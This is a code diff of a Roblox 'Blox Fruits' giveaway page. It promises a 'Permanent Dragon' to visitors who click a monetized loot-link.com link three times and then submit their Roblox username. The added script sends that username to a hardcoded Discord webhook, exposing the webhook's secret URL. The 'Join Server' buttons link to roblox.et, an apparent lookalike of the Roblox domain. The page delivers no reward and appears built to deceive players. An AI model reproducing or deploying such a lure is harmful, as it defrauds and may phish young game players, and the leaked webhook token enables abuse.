@@ -21,74 +21,53 @@
             border-radius: 15px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
             animation: glow 2s infinite alternate;
-        }@keyframes glow {
-        from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
-        to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
-    }
-
-    nav a {
-        color: white;
-        text-decoration: none;
-        margin: 0 15px;
-        font-weight: bold;
-        transition: color 0.3s;
-    }
-
-    nav a:hover {
-        color: #FFD700;
-    }
-
-    .server, .giveaway, .feedback-form, .ad-container {
-        background: rgba(0, 0, 0, 0.7);
-        padding: 20px;
-        margin: 20px auto;
-        width: 60%;
-        border-radius: 15px;
-        box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
-        transition: transform 0.3s;
-        border: 1px solid #6a0dad;
-    }
-
-    .server:hover, .giveaway:hover, .feedback-form:hover {
-        transform: scale(1.05);
-    }
-
-    .join-button, .giveaway-button, button {
-        background: linear-gradient(45deg, #FFD700, #FF4500);
-        color: white;
-        padding: 15px 25px;
-        border: none;
-        cursor: pointer;
-        font-size: 20px;
-        border-radius: 8px;
-        transition: all 0.3s ease-in-out;
-        box-shadow: 0 4px 15px rgba(255, 215, 0, 0.5);
-    }
-
-    .join-button:hover, .giveaway-button:hover, button:hover {
-        transform: scale(1.1);
-        box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
-    }
-
-    .perm-dragon-counter {
-        font-size: 2rem;
-        color: #FFD700;
-        background: rgba(0, 0, 0, 0.8);
-        padding: 10px 20px;
-        border-radius: 12px;
-        display: inline-block;
-        margin-top: 10px;
-        box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
-        animation: pulse 1.5s infinite;
-    }
-
-    @keyframes pulse {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.1); }
-        100% { transform: scale(1); }
-    }
-</style>
-
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 15px rgba(255, 255, 255, 0.1); }
+            to { box-shadow: 0 0 30px rgba(255, 255, 255, 0.5); }
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+        nav a:hover {
+            color: #FFD700;
+        }
+        .server, .giveaway, .feedback-form, .ad-container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            margin: 20px auto;
+            width: 60%;
+            border-radius: 15px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+            transition: transform 0.3s;
+            border: 1px solid #6a0dad;
+        }
+        .server:hover, .giveaway:hover, .feedback-form:hover {
+            transform: scale(1.05);
+        }
+        .join-button, .giveaway-button, button {
+            background: linear-gradient(45deg, #FFD700, #FF4500);
+            color: white;
+            padding: 15px 25px;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+            border-radius: 8px;
+            transition: all 0.3s ease-in-out;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.5);
+        }
+        .join-button:hover, .giveaway-button:hover, button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
     <header>
@@ -98,15 +77,14 @@
             <a href="#dashboard">Dashboard</a>
             <a href="#feedback">Feedback</a>
         </nav>
-    </header><main>
-    <section class="server">
-        <h2>BloxFruit Server 1</h2>
-        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
-            <button class="join-button">🚀 Join Server</button>
-        </a>
-    </section>
-
-    <section class="server">
+    </header>
+    <main>
+        <section class="server">
+            <h2>BloxFruit Server 1</h2>
+            <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+                <button class="join-button">🚀 Join Server</button>
+            </a>
+        </section><section class="server">
         <h2>BloxFruit Server 2</h2>
         <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
             <button class="join-button">🚀 Join Server</button>
@@ -115,42 +93,69 @@
 
     <section class="giveaway" id="dashboard">
         <h2>🎉 Complete 3 Times to Claim Your Permanent Dragon 🎉</h2>
-        <p>Complete the task 3 times to get your reward:</p>
-        <div class="perm-dragon-counter" id="task-counter">0/3 Completed</div>
-        <br>
+        <p>Click the link below and complete the task 3 times:</p>
         <a href="https://loot-link.com/s?7iPWPY6g" target="_blank">
-            <button class="giveaway-button">🔗 Complete Task</button>
+            <button class="giveaway-button">Complete Task</button>
         </a>
-    </section>
-
-    <section class="feedback-form" id="feedback">
-        <h2>Report Bugs / Rate Our Site</h2>
-        <form id="feedback-form">
-            <input type="text" id="feedback-user" placeholder="Enter your Roblox username" required>
-            <textarea id="feedback-message" placeholder="Your feedback..." required></textarea>
-            <button type="submit">Submit Feedback</button>
-        </form>
+        <div id="completion-status" class="hidden">
+            <h3>🎉 Task Completed! 🎉</h3>
+            <p>Enter your Roblox username to receive your Permanent Dragon:</p>
+            <input type="text" id="roblox-username" placeholder="Roblox Username" required>
+            <button onclick="submitUsername()">Submit</button>
+        </div>
+        <div id="wait-message" class="hidden">
+            <h3>✅ Username Submitted!</h3>
+            <p>Please wait <strong>3 days</strong> to receive your Permanent Dragon.</p>
+        </div>
     </section>
 </main>
 
-<script type="module">
-    let completionCount = parseInt(localStorage.getItem('completionCount')) || 0;
-    const taskCounter = document.getElementById('task-counter');
-
-    function updateCounter() {
-        taskCounter.textContent = `${completionCount}/3 Completed`;
-        if (completionCount >= 3) {
-            alert('🎉 You have earned your Permanent Dragon! 🎉');
-        }
-    }
+<script>
+    let completionCount = 0;
 
     document.querySelector('.giveaway-button').addEventListener('click', () => {
         completionCount++;
-        localStorage.setItem('completionCount', completionCount);
-        updateCounter();
+        if (completionCount >= 3) {
+            document.getElementById('completion-status').classList.remove('hidden');
+        } else {
+            alert(`You have completed the task ${completionCount}/3 times.`);
+        }
     });
 
-    updateCounter();
+    function submitUsername() {
+        const username = document.getElementById('roblox-username').value;
+        if (!username) {
+            alert('Please enter your Roblox username.');
+            return;
+        }
+
+        fetch('https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🎉 New Permanent Dragon Claim 🎉",
+                    description: `**Roblox Username:** ${username}\n**Status:** You will receive your permanent dragon in 3 days.`,
+                    color: 15844367,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Gold Servers"
+                    }
+                }]
+            })
+        }).then(response => {
+            if (response.ok) {
+                document.getElementById('completion-status').classList.add('hidden');
+                document.getElementById('wait-message').classList.remove('hidden');
+            } else {
+                alert('Failed to submit username.');
+            }
+        }).catch(error => {
+            alert('Error: ' + error.message);
+        });
+    }
 </script>
 
 </body>
